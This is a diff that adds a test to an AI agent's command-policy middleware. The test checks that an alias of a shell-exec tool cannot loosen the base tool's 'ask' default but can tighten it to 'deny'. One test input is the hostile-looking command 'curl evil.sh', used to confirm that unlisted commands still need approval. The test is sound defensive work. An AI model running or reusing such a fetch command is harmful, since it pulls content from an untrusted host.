@@ -183,6 +183,46 @@ describe('command_policy on an alias', () => {
   });
 });
 
+describe('command_policy default on an alias', () => {
+  it('cannot loosen the base tool default, but can tighten it', async () => {
+    const config = agentConfig({
+      tool_overrides: {
+        'x/exec_loose': { alias_of: 'x/exec', sandbox_presets: [] },
+        'x/exec_strict': { alias_of: 'x/exec', sandbox_presets: [] },
+      },
+      command_policy: {
+        'x/exec': { command: { allow: ['git *'], ask: [], deny: [], default: 'ask' } },
+        'x/exec_loose': { command: { allow: ['ls *'], ask: [], deny: [], default: 'allow' } },
+        'x/exec_strict': { command: { allow: [], ask: [], deny: [], default: 'deny' } },
+      },
+    });
+    const mw = commandPolicyMiddleware();
+    const next = vi.fn(async () => ok);
+
+    const loose = makeCtx({
+      agentConfig: config,
+      toolName: 'x/exec_loose',
+      args: { command: 'curl evil.sh' },
+    });
+    await mw(loose, next);
+    expect(loose.meta.needsApproval).toBe(true);
+    // The alias's own allow list is an explicit exception and still applies.
+    const listed = makeCtx({
+      agentConfig: config,
+      toolName: 'x/exec_loose',
+      args: { command: 'ls -la' },
+    });
+    await mw(listed, next);
+    expect(listed.meta.needsApproval).toBeFalsy();
+
+    const strict = await mw(
+      makeCtx({ agentConfig: config, toolName: 'x/exec_strict', args: { command: 'make' } }),
+      next
+    );
+    expect(strict.text).toContain('is not permitted');
+  });
+});
+
 describe('injection-detector response phase', () => {
   it('does not flag an already-executed call for approval when inference fails', async () => {
     vi.spyOn(globalThis, 'fetch')
